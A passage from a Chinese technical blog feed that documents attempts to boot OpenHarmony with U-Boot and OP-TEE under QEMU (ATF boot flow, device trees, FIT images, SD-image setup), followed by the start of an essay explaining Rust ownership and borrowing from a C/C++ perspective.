launch-terminal,54321,<span class="string">&quot;Secure World&quot;</span>)</span><br><span class="line">    $(call wait-for-ports,54320,54321)</span><br><span class="line">    <span class="built_in">cd</span> $(BINARIES_PATH) &amp;&amp; $(QEMU_BUILD)/aarch64-softmmu/qemu-system-aarch64 \</span><br><span class="line">        -nographic \</span><br><span class="line">        -serial tcp:localhost:54320 -serial tcp:localhost:54321 \</span><br><span class="line">        -smp $(QEMU_SMP) \</span><br><span class="line">        -s -S -machine virt,secure=on,mte=$(QEMU_MTE),gic-version=$(QEMU_GIC_VERSION),virtualization=$(QEMU_VIRT) \</span><br><span class="line">        -cpu $(QEMU_CPU) \</span><br><span class="line">        -d unimp -semihosting-config <span class="built_in">enable</span>=on,target=native \</span><br><span class="line">        -m $(QEMU_MEM) \</span><br><span class="line">        -bios bl1.bin\</span><br><span class="line">        -initrd rootfs.cpio.gz \</span><br><span class="line">        -kernel Image -no-acpi \</span><br><span class="line">        -append <span class="string">&#x27;console=ttyAMA0,38400 keep_bootcon root=/dev/vda2 $(QEMU_KERNEL_BOOTARGS)&#x27;</span> \</span><br><span class="line">        $(QEMU_XEN) \</span><br><span class="line">        $(QEMU_EXTRA_ARGS)</span><br></pre></td></tr></table></figure><p>先观察启动日志：</p><p><img src="imgs/optee-qemu-start-1.png" width="550px" /></p><p><img src="imgs/optee-qemu-start-2.png" width="550px" /></p><p>ATF 作为最底层固件，OP-TEE OS、 BootLoader、Linux 内核的加载都是由 ATF 来完成的，而且 <strong>ATF 实现了安全引导的功能</strong>。</p><p>bl2 启动时通过触发 SMC 通知 bl1 将 CPU 控制权限交给 bl31，bl31 通过解析特定段中是否存在 OP-TEE Kernel 的入口来确定是否需要加载 OP-TEE。OP-TEE Kernel 启动后会触发安全监控模式调用重新进入到 bl31 中继续执行。</p><p>bl31 通过查询链表的方式获取下一个需要被加载 REE 侧的镜像文件，并设定好 REE 侧运行时 CPU 的状态和运行环境，然后退出 EL3 并进入 REE 侧镜像文件的启动，一般第一个 REE 侧镜像文件为 BootLoader，BootLoader 会加载 Linux 内核。</p><p>上面的安全引导过程是一个比较复杂和标准化的过程：</p><p><img src="imgs/atf-boot-seq.png" width="650px"/></p><h3 id="2-3-2-设备树文件（Device-Tree）"><a href="#2-3-2-设备树文件（Device-Tree）" class="headerlink" title="2.3.2 设备树文件（Device Tree）"></a>2.3.2 设备树文件（Device Tree）</h3><p>Linux kernel 在 ARM 架构中引入 <code>device tree</code>（flattened device tree，FDT）的时候，怀揣着一个 Unify Kernel 的梦想，即同一个 Image，通过切换不同的 DTB（device tree binary/blob）支持多个不同的平台。</p><p>device tree 在 kernel 中普及之后，U-Boot 也引入了 device tree 的概念。因此为了和 kernel 类似，U-Boot也需要一种新的 image 格式，这种格式需要支持以下特性：</p><ul><li>Image 中需要包含多个 DTB 文件；</li><li>可以方便的选择使用哪个 DTB 文件；</li></ul><p>结合以上两点需求，U-Boot 推出了新的 image 格式：FIT image（flattened image tree）。它利用了 Device Tree Source files（DTS）的语法，生成的 Image 文件也和 DTB 文件类似（从 ITS 编译为 ITB）；</p><p>在 ARM64 架构下，U-Boot 启动 Linux 内核<strong>必须使用设备树（Device Tree）文件</strong>。</p><p>与早期的 ARM32 架构不同，ARM64 Linux 内核完全移除了对“板级文件”（Board-Specific Files）的支持，强制要求通过设备树（<code>*.dtb</code>）描述硬件配置。没有设备树，内核无法获取硬件信息（如 CPU、内存、外设等），导致启动失败。</p><p>U-Boot启动内核时需完成以下步骤：</p><ol><li><strong>加载内核镜像</strong>：将 <code>Image</code> 或 <code>vmlinux</code> 加载到内存。</li><li><strong>加载设备树文件</strong>：将编译后的设备树二进制文件（<code>*.dtb</code>）加载到另一块内存区域。</li><li><strong>传递参数</strong>：通过寄存器（如 ARM64 的<code>x0</code>）将设备树地址告知内核。</li></ol><p>可以在 U-Boot 命令行中执行下面的指令来查看（如果是以 <code>-sd</code> 形式给出）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看设备树加载地址</span></span><br><span class="line"><span class="built_in">printenv</span> fdtaddr</span><br><span class="line"><span class="comment"># 手动加载设备树示例</span></span><br><span class="line"><span class="comment"># sd/emmc id=0, partition 1</span></span><br><span class="line">load mmc 0:1 <span class="variable">$&#123;fdtaddr&#125;</span> /boot/myboard.dtb</span><br></pre></td></tr></table></figure><h3 id="2-3-2-U-Boot-OpenHarmony-Edu-Dist-启动方案"><a href="#2-3-2-U-Boot-OpenHarmony-Edu-Dist-启动方案" class="headerlink" title="2.3.2 U-Boot + OpenHarmony Edu Dist 启动方案"></a>2.3.2 U-Boot + OpenHarmony Edu Dist 启动方案</h3><p>考虑最简单的情形，直接由  U-Boot 启动 OpenHarmony，如果成功后再尝试加入 OPTEE。</p><h4 id="U-Boot-指令-UBOOT-BOOTCOMMAND"><a href="#U-Boot-指令-UBOOT-BOOTCOMMAND" class="headerlink" title="U-Boot 指令 (UBOOT_BOOTCOMMAND)"></a>U-Boot 指令 (<code>UBOOT_BOOTCOMMAND</code>)</h4><p><code>booti</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">booti &lt;kernel_addr&gt; [initrd_addr[:initrd_size]] [fdt_addr]</span><br></pre></td></tr></table></figure><ul><li><code>booti</code> 命令用于引导内核时加载一个二进制的内核镜像 (<code>Image</code>)，通常针对 ARM64 架构。</li><li>与 <code>bootm</code> / <code>bootz</code> 类似，<code>booti</code> 也用于启动内核，但是二者针对的镜像格式不同。   <ul><li><code>bootm</code> 主要用于启动 uImage 格式的内核（一般由 <code>mkimage</code> 工具打包而成）；</li><li><code>bootz</code> 用于启动 zImage 格式的内核；</li><li><code>booti</code> 则用于加载 Linux 的原始内核镜像（<code>Image</code> 文件）；</li></ul></li></ul><h4 id="尝试一：将-Image-和-ramdisk-img-打包成-boot-img-FAILED"><a href="#尝试一：将-Image-和-ramdisk-img-打包成-boot-img-FAILED" class="headerlink" title="尝试一：将 Image 和 ramdisk.img 打包成 boot.img (FAILED)"></a>尝试一：将 <code>Image</code> 和 <code>ramdisk.img</code> 打包成 <code>boot.img</code> (FAILED)</h4><p>理想情况下，启动过程应该是：</p><ul><li>bootloader 初始化 ROM 和 RAM 等硬件，加载分区表信息。</li><li>bootloader 根据分区表加载 <code>boot.img</code>，从中解析并加载 <code>ramdisk.img</code> 到内存中。</li><li>bootloader 准备好分区表信息，ramdisk 地址等信息，进入内核，内核加载 ramdisk 并执行 init。</li><li>init 准备初始文件系统，挂载 <code>required.fstab</code>（包括 <code>system.img</code> 和 <code>vendor.img</code> 的挂载）。</li><li>扫描 <code>system.img</code> 和 <code>vendor.img</code> 中 <code>etc/init</code> 目录下的启动配置脚本，执行各个启动命令。</li></ul><p>先 dump 出 <code>-machine virt</code> 机器的 DTB 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-machine virt,dumpdtb=./virt.dtb</span><br></pre></td></tr></table></figure><p>使用 <code>u-boot</code> 编译后的工具 <code>dtc</code> 解析内容（便于查看）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dtc -I dtb -O dts ./virt.dtb &gt; virt.dts</span><br></pre></td></tr></table></figure><p>然后自行为 U-Boot 编写 ITS（Image Tree Source）文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/dts-v1/;</span><br><span class="line"> </span><br><span class="line">/ &#123;</span><br><span class="line">    description = <span class="string">&quot;U-Boot zImage-dtb-ramdisk&quot;</span>;</span><br><span class="line">    <span class="meta">#address-cells = <span class="string">&lt;1&gt;</span>;</span></span><br><span class="line">    images &#123;</span><br><span class="line">        kernel<span class="number">-1</span> &#123;</span><br><span class="line">            description = <span class="string">&quot;Linux kernel &quot;</span>;</span><br><span class="line">            data = /incbin/(<span class="string">&quot;./Image&quot;</span>);</span><br><span class="line">            type = <span class="string">&quot;kernel&quot;</span>;</span><br><span class="line">            arch = <span class="string">&quot;aarch64&quot;</span>;</span><br><span class="line">            os = <span class="string">&quot;linux&quot;</span>;</span><br><span class="line">            compression = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">            load = &lt;<span class="number">0x40800000</span>&gt;;</span><br><span class="line">            entry = &lt;<span class="number">0x40800000</span>&gt;;</span><br><span class="line">        &#125;;</span><br><span class="line">         dtb<span class="number">-1</span> &#123;</span><br><span class="line">            description = <span class="string">&quot;ohos dtb &quot;</span>;</span><br><span class="line">            data = /incbin/(<span class="string">&quot;./virt.dtb&quot;</span>);</span><br><span class="line">            type = <span class="string">&quot;flat_dt&quot;</span>;</span><br><span class="line">            arch = <span class="string">&quot;aarch64&quot;</span>;</span><br><span class="line">            os = <span class="string">&quot;linux&quot;</span>;</span><br><span class="line">            compression = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        ramdisk<span class="number">-1</span> &#123;</span><br><span class="line">            description = <span class="string">&quot;Ramdisk Image&quot;</span>;</span><br><span class="line">            data = /incbin/(<span class="string">&quot;./ramdisk.img&quot;</span>);</span><br><span class="line">            type = <span class="string">&quot;ramdisk&quot;</span>;</span><br><span class="line">            arch = <span class="string">&quot;aarch64&quot;</span>;</span><br><span class="line">            os = <span class="string">&quot;linux&quot;</span>;</span><br><span class="line">            compression = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">            load = &lt;<span class="number">0x44000000</span>&gt;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    configurations &#123;</span><br><span class="line">        <span class="keyword">default</span> = <span class="string">&quot;conf-boot&quot;</span>;</span><br><span class="line">        conf-boot &#123;</span><br><span class="line">            description = <span class="string">&quot;booting ARM Linux Kernel Image Ramdisk&quot;</span>;</span><br><span class="line">            kernel = <span class="string">&quot;kernel-1&quot;</span>;</span><br><span class="line">            fdt = <span class="string">&quot;dtb-1&quot;</span>;</span><br><span class="line">            ramdisk = <span class="string">&quot;ramdisk-1&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>mkimage</code> 编译生成 <code>boot.img</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkimage -f boot.its boot.img</span><br></pre></td></tr></table></figure><p>使用 <code>u-boot.bin</code>（U-Boot 编译产物，引导固件）作为 BIOS：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-bios u-boot.bin \</span><br></pre></td></tr></table></figure><p>然后尝试了两种加载方法：</p><ul><li><code>virtio-blk-device</code> 加载；</li><li>进入 U-Boot 命令行直接 load 文件：<ul><li>只显示 <code>virt.dtb</code> 加载到 <code>0x40000000</code> 处；</li></ul></li></ul><p>失败，U-Boot 未能识别分区情况。</p><h4 id="尝试二：将-Image-设备树-ramdisk-img-打包进-SD-设备-FAILED"><a href="#尝试二：将-Image-设备树-ramdisk-img-打包进-SD-设备-FAILED" class="headerlink" title="尝试二：将 Image, 设备树, ramdisk.img 打包进 SD 设备 (FAILED)"></a>尝试二：将 <code>Image</code>, 设备树, <code>ramdisk.img</code> 打包进 SD 设备 (FAILED)</h4><p>创建空的 SD Card 镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=boot.disk bs=1M count=1024</span><br></pre></td></tr></table></figure><p>创建 GPT 分区，两个分区，一个存放 Kernel 和设备树，另一个存放 Rootfs：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sgdisk -n 0:0:+10M -c 0:kernel boot.disk</span><br><span class="line">sgdisk -n 0:0:0 -c 0:rootfs boot.disk</span><br></pre></td></tr></table></figure><p>检查结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sgdisk -p boot.disk</span><br></pre></td></tr></table></figure><p>找个空闲的 loop 设备，并且把镜像挂载上去，准备写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">losetup -f</span><br><span class="line"><span class="comment"># 假设返回 /dev/loopxx</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo losetup /dev/loopxx boot.disk</span><br><span class="line"><span class="comment"># 更新之前创建的表，让 host kernel 看到</span></span><br><span class="line">sudo partprobe /dev/loopxx</span><br></pre></td></tr></table></figure><p>对新的分区格式化为 EXT4：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkfs.ext4 /dev/loopxxp1</span><br><span class="line">sudo mkfs.ext4 /dev/loopxxp2</span><br></pre></td></tr></table></figure><p>挂载到两个任意不同空目录上，然后复制文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t ext4 /dev/loopxxp1 p1/</span><br><span class="line">sudo mount -t ext4 /dev/loopxxp2 p2/</span><br><span class="line">sudo <span class="built_in">cp</span> Image p1/</span><br><span class="line">sudo <span class="built_in">cp</span> virt.dtb p1/</span><br><span class="line">sudo <span class="built_in">cp</span> ramdisk.img p2/</span><br></pre></td></tr></table></figure><p>卸载 loop 设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo umount p1 p2</span><br><span class="line">sudo losetup -d /dev/loopxx</span><br></pre></td></tr></table></figure><p>将写好的 <code>boot.disk</code> 作为 SD 设置 QEMU，U-Boot 启动时用 <code>mmc</code> 指令读取。</p><p>失败，U-Boot 未能通过内存校验。</p><h4 id="尝试三：使用-mkimage-生成-ITB-文件，U-Boot-直接加载-BUGGY"><a href="#尝试三：使用-mkimage-生成-ITB-文件，U-Boot-直接加载-BUGGY" class="headerlink" title="尝试三：使用 mkimage 生成 ITB 文件，U-Boot 直接加载 (BUGGY)"></a>尝试三：使用 <code>mkimage</code> 生成 ITB 文件，U-Boot 直接加载 (BUGGY)</h4><p>添加 OPTEE 时，注意编译选项给 OPTEE OS 指定的 <code>NS_SHM</code>（Non-Safe Shared Memory）从 <code>0x42000000</code> 开始。因此把 Kernel 地址改到 <code>0x42000000</code>，RamDisk 改到 <code>0x45000000</code>，然后将 <code>mkimage -f xxx.its boot.itb</code> 加载到 <code>0x50200000</code>，并且从该处启动。</p><p>最终成功启动 OPTEE Kernel，并且成功加载 OpenHarmony Kernel。但是卡在 Starting Kernel 这步，仍然在排查原因。</p><h2 id="2-4-OpenTrustee-ChCore-OS-迁移试验"><a href="#2-4-OpenTrustee-ChCore-OS-迁移试验" class="headerlink" title="2.4 OpenTrustee (ChCore OS) 迁移试验"></a>2.4 OpenTrustee (ChCore OS) 迁移试验</h2><p>未完待续…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Part-1-机密计算与-TEE-技术入门知识整理&quot;&gt;&lt;a href=&quot;#Part-1-机密计算与-TEE-技术入门知识整理&quot; class=&quot;headerlink&quot; title=&quot;Part 1. 机密计算与 TEE 技术入门知识整理&quot;&gt;&lt;/a&gt;Part 1. 机密</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="TEE" scheme="https://blog.sjtuxhw.top/tags/TEE/"/>
    
    <category term="TrustZone" scheme="https://blog.sjtuxhw.top/tags/TrustZone/"/>
    
    <category term="OpenHarmony" scheme="https://blog.sjtuxhw.top/tags/OpenHarmony/"/>
    
  </entry>
  
  <entry>
    <title>另一个角度看 Rust 所有权和借用</title>
    <link href="https://blog.sjtuxhw.top/technical/rust-owner/"/>
    <id>https://blog.sjtuxhw.top/technical/rust-owner/</id>
    <published>2025-04-06T12:20:14.000Z</published>
    <updated>2025-04-17T15:47:07.262Z</updated>
    
    <content type="html"><![CDATA[<p>笔者在一开始了解 Rust 的内存管理机制的时候，阅读了官方文档，以及网络上的教科书，它们首先都引入了所谓 “所有权” 和 “借用” 的概念。</p><p>笔者认为这样的叙述方法非常合适，特别是如果读者对操作系统原理与实现、C/C++ 语言不了解，那么这么讲授的方法是大概是最好的。因为这能够很快教给读者 rust 语言的规则，而不需要很多的知识储备或者语境。</p><p>但这也带来了弊端：很多读者会把它当作只有 rust 才有的特性、规定，但实际上这种系统设计思想可以用在很多地方。对于为什么 rust 要这么设计，则需要读者学了很长时间之后，结合计算机相关基础知识才能慢慢领会。</p><p>因此，个人认为应该从 C/C++ 如何变得安全的角度来讨论 rust 的这个语言特性会比较方便，因为 rust 本身就是在对标 C/C++ 内存不安全的问题，然后在此基础上进行改进。</p><p>笔者想提供一种思路，从 C/C++ 开发者的视角来解释 rust 为什么这么设计，然后再定义这两个性质，希望能对读者有所启发。本人学识短浅，望读者勘误/斧正。</p><h3 id="如何设计一种全新的内存管理机制？"><a href="#如何设计一种全新的内存管理机制？" class="headerlink" title="如何设计一种全新的内存管理机制？"></a>如何设计一种全新的内存管理机制？</h3><p>假设你想创造一个新的编译型语言（就叫 rust），想和 C/C++ 一样，<u>支持直接操纵变量的内存地址、引用</u>，但想要更安全，并且正在为这个语言设计编译器。</p><p>我们知道，对于一个正常高级语言而言（无论是 C++/Java 还是其他的什么），为变量分配内存的方式有两类：</p><ul><li>一个是为编译时已知大小的变量分配（例如一个整型）。由于编译时长度已知，我们直接可以让编译器在栈（stack）上管理它们就行，这样不仅空间和时间效率高，而且不会有内存泄漏问题；</li><li>一个是运行时才知道大小的变量分配（例如一个保存用户输入的字符串）。这时需要程序运行时动态分配内存，也正是为了应对这种需求，OS 才有了 “堆”（heap）这种运行时内存结构，允许程序在运行时动态分配内存。</li></ul><p>好，第一个（已知大小）的变量分配已经解决。以 C++ 为例，我们在写编译器时只需要把这些变量考虑在内，然后生成汇编的时候在当前函数的 activation record 中按需要的大小移动 <code>%rsp</code> 分配就行。</p><p>对于第二个（编译时未知大小）的变量分配，我们通常有几种办法：</p><ul><li><p>语言直接向开发者暴露分配和释放堆空间的接口（C/C++）。这种内存管理方式需要手动分配和释放堆上内存，可能编写出内存不安全代码/内存泄漏；</p><blockquote><p>所谓内存不安全代码，可能是访问了指针指向的错误的内存区域、错误地修改了某块内存，导致程序意外结束。</p><p>所谓内存泄漏不是真正 “泄漏”，在 OS 的角度看，只是应用程序内存释放不及时，或者要释放的地址丢了（unreachable），导致释放速度赶不上分配速度，最终耗尽了当前进程的虚拟内存空间。</p></blockquote></li><li><p>语言向开发者暴露分配堆空间的接口 (Java/JavaScript) 或者 自动分配堆空间 (Python)，并采用自动垃圾回收（GC）的方式来释放堆空间。这种内存管理方式的好处是开发者不需要关心堆空间释放问题。</p><p>但是 GC 对程序的影响就很有讲究了，人们为了防止 “GC 释放速度赶不上分配速度” 这种情况发生，想了很多种 GC 算法，例如 mark &amp; swap、reference count、copy collection、generation collection、Parallel Scavenge、G1GC、ZGC 等等，限于篇幅不再展开。</p><p>即便想的如此周全，还有各种各样的问题：例如 STW（时停开销）、堆扫描的时间开销、循环引用导致内存泄漏（指 refcnt 方法），等等。</p></li></ul><p>于是你想，如果我们开发的语言既不想用第一种方法（不安全），也不想用第二种方法（性能没法达到 C/C++ 水平），能不能<strong>同时兼顾安全性和性能</strong>呢？</p><p>看起来只有<strong><u>在编译时就完成 “编译时未知大小的变量” 的堆分配工作</u></strong>了（让编译器帮我们管理堆空间）！</p><p>这就是 rust 语言在设计时考虑内存分配的思路。</p><p>好，现在我们需要解决针对变量操纵的几个问题：如何进行变量分配、如何进行变量传递（何时值传递、何时引用传递）。</p><p>不妨先完全借鉴 C/C++ 内存分配的思路，为 rust 设计一种方案：</p><ul><li>对于编译时已知大小的变量，直接分配在栈上，默认使用值传递。即便是复合数据类型（不管有没有指针域）都是如此。<ul><li>引入 “引用” 类型，来显式使用引用传递，节约构造成本。</li><li>复制构造和值传递的方法，就是逐内存 byte 的复制，我们不妨称之为 <strong><u>copy trait</u></strong>（<code>Copy</code> 特性）；</li></ul></li><li>对于编译时未知大小的变量，分配在堆上（需要手动释放），使用指针操纵（读写），指针本身使用值传递。</li></ul><p>这种方案对于当年的 rust 创造者来说不可容忍，因为：</p><ul><li>内存不安全。我们希望编译器帮我们回收堆上的空间；</li><li>指针可以通过值传递 / copy trait 到处传播，不知道何时释放比较合适，不知道会不会出现 UAF / double free 的问题。</li></ul><p>所以作出改进：</p><ol><li>指针（当然在 rust 中可以不叫指针，只是表示堆上数据的一个类型）可以值传递，但是必须让编译器可以追踪到、必须明确变量内存释放的 “责任” 在确定的变量身上（<strong><u>把这个动作和有“责任”的变量的生命周期绑定起来</u></strong>，类似 C++ RAII），以便进行准确无误的、及时的回收工作，并且不允许实现隐式的 copy trait；</li><li>用于引用传递的 “引用” 类型需要区分变量的可变性（因为 rust 之前设计的 “变量可变性” 要应对并发安全的场景）。并且需要注意到，引用也会影响到编译器对 “变量内存释放的责任” 的追踪。我们特别规定“引用”类型的传递是不能传递它引用的变量的 “内存释放的责任” 的！</li></ol><h3 id="对号入座"><a href="#对号入座" class="headerlink" title="对号入座"></a>对号入座</h3><p>其实，<u>改进 1 中 “内存释放的责任” 就是所有权抽象，改进 2 中的 “引用不能传递内存释放的责任” 就是借用抽象</u>。</p><p>到此为止，我们就能理解为什么 rust 要设计 “所有权” 和 “借用” 了。</p><p>现在笔者再搬出所有权、借用的 “规定”，你看看能不能对号入座了？</p><p>Rust “所有权” 制定了以下规则（为了明确内存释放的责任）：</p><ol><li><p>Rust 中的<strong><u>每个值（特指堆上的数据）在同一时刻只能被一个变量所拥有</u></strong>，这个变量被称为该值的 “<strong>所有者 (owner)</strong>”；</p><blockquote><p>从变量的角度说，同一时刻只能绑定一个特定的值；</p><p>其实有个特例（参见下文），可变引用（<code>&amp;mut T</code>）即便信息在栈上，也被所有权管理，因为它经过编译器翻译后底层是指针，为了确保赋值/复制的数据安全、方便所有权追踪，就这么设计了。</p></blockquote></li><li><p>当所有者离开绑定值声明的作用域后，这个值将被丢弃（drop）；</p></li></ol><p>就第一条而言，我们记住一个原则：<strong><u>“所有权” 是针对堆上的数据的</u></strong>，我们需要所有权管理的也就是堆上的数据。</p><p>就第二条而言，大多数语言在效果上都是差不多的：即一个变量只在声明有效的作用域内能够使用。</p><p>Rust “引用/借用” 制定了以下基本规则：</p><ol><li>引用需要区分变量的可变性（<code>&amp;T</code> 和 <code>&amp;mut T</code>，我们不难发现 <strong><u>Rust 的引用就是 C++ 指针的另一种表述形式</u></strong>，而不是 C++ 的引用）；</li><li>一个变量的不可变引用（<code>&amp;T</code>）生命周期内可以出现多次，因为不会改变所有权；<ul><li>因为不可变引用的安全性，<code>&amp;T</code> 单独实现 Copy Trait（意味着它不被所有权管理）；</li></ul></li><li>一个变量的可变引用（<code>&amp;mut T</code>）在它的生命周期内只能出现一次、并且与不可变引用互斥。这是为了防止变量可见性冲突，也就是并发程序中共享资源的读者和写者间的关系；<ul><li>同时考虑到可变引用也要支持赋值/复制，因此不实现 Copy Trait（<u>意味着即便它不存放在堆上，也被所有权管理</u>！）；</li><li>考虑一下，可变引用被编译器翻译后，底层实现是指针，因此在所有权管理范围内；</li></ul></li></ol><p>Rust 通过上面的 “所有权” 和 “借用” 的规则，巧妙地保证了：</p><ul><li>编译器能够始终追踪到堆上变量整个生命周期的使用情况，并且能自动判断释放的合适时机，不需要手动释放，也不需要 GC；</li><li>引用不会干扰内存管理的安全性；</li><li>可变引用的互斥性，结合变量可变性限制，<strong><u>杜绝数据竞争现象</u></strong>，维护数据安全假设。</li></ul><p>最后，Rust 利用是否定义 Copy Trait 将一个类型是否会被所有权管理区分开来，方便具体实现。</p><h3 id="归纳，然后演绎"><a href="#归纳，然后演绎" class="headerlink" title="归纳，然后演绎"></a>归纳，然后演绎</h3><p>现在我们明白了 Rust “所有权” 和 “借用” 的内容和原因，Rust 所有看似难以理解的语言特性都能得到合理解释。我们举几个例子：</p><p><strong>Q0：为什么下面的例子有所有权问题？是不是违反了 “引用不会传递所有权” 的约定？</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">mut1</span> = &amp;<span class="keyword">mut</span> s1;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = mut1;</span><br><span class="line">    <span class="comment">// 已知 println 前 x 已经析构，并不存在两个可变引用冲突的问题</span></span><br><span class="line">    <span class="comment">// 但是报错 mut1 所有权已经转移</span></span><br><span class="line">    <span class="title function_ invoke__">println</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, mut1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答：并没有违反。因为直到最后 <code>s1</code> 仍然可以访问（你可以把 <code>mut1</code> 改成 <code>s1</code> 看看），证明 <code>s1</code> 的可变引用不会传递 <code>s1</code> 的所有权。</p><p>这个例子只是恰好展示了可变引用的性质。我们知道如果同时定义同个变量的两个可变引用，编译器会提示冲突：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">v</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello,&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r</span> = &amp;<span class="keyword">mut</span> v;</span><br><span class="line"><span class="comment">// 编译器错误：有多于一个可变引用</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = &amp;<span class="keyword">mut</span> v;</span><br></pre></td></tr></table></figure><p>但是编译器允许可变引用传递，不过代价是所有权传递：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">v</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello,&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r</span> = &amp;<span class="keyword">mut</span> v;</span><br><span class="line"><span class="comment">// 目前是正确的，但编译器的做法是，将 `r` 的所有权传给 `x` 了</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = r;</span><br></pre></td></tr></table></figure><p>这恰恰印证了一点：<strong><u><code>&amp;T</code> 不可变引用是有 Copy Trait 的，但是可变引用 <code>&amp;mut T</code>没有 Copy Trait，因此赋值会出现所有权转移</u></strong>（参见“对号入座”一节的可变引用规则）。</p><p><strong><u>可变引用和 不可变引用 相当于 C++ 中的指针和常量指针</u></strong>（不是 C++ 引用，想想为什么）。</p><p>因此最开始的例子中的问题是，<code>s1</code> 并没有所有权转移，所有权转移的是 <code>mut1</code> 可变引用变量本身：<code>mut1</code> 所有权转移到 <code>x</code> 上，然后 <code>x</code> 立即被编译器设计的汇编析构了，<code>mut1</code> 当然是无效的。</p><p><strong>Q1：为什么下面的例子没有内存释放或者所有权的问题？</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span 